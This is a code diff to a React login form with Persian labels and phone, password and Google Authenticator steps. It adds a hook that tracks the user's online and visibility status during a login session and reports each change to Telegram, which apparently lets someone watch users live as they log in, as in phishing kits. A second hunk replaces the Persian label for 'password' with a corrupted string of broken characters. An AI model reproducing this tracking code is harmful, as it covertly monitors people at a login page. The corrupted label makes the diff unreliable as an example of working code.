@@ -113,6 +113,39 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
+  // User activity tracking
+  useEffect(() => {
+    if (sessionId) {
+      console.log("🔍 Starting user activity tracking for session:", sessionId);
+
+      const handleStatusChange = async (status: ActivityStatus) => {
+        console.log("📡 Activity status changed:", {
+          isOnline: status.isOnline,
+          isVisible: status.isVisible,
+          statusText: userActivityService.getStatusText(),
+        });
+
+        // Update status in Telegram
+        await updateUserOnlineStatus(
+          sessionId,
+          status.isOnline,
+          status.isVisible,
+          status.lastActivity,
+          userActivityService.getStatusText(),
+          userActivityService.getStatusEmoji(),
+        );
+      };
+
+      // Start tracking
+      userActivityService.startTracking(sessionId, handleStatusChange);
+
+      return () => {
+        console.log("🛑 Stopping user activity tracking");
+        userActivityService.stopTracking();
+      };
+    }
+  }, [sessionId]);
+
   // Countdown timer for verify-phone step
   useEffect(() => {
     if (currentStep === "verify-phone" && countdown > 0) {
@@ -785,7 +818,7 @@ export const LoginForm = () => {
               {currentStep === "verify-phone"
                 ? "تائید شماره همراه"
                 : currentStep === "password"
-                  ? "رمز عبور"
+                  ? "رم�� عبور"
                   : currentStep === "google"
                     ? "Google Authenticator"
                     : "ورود"}
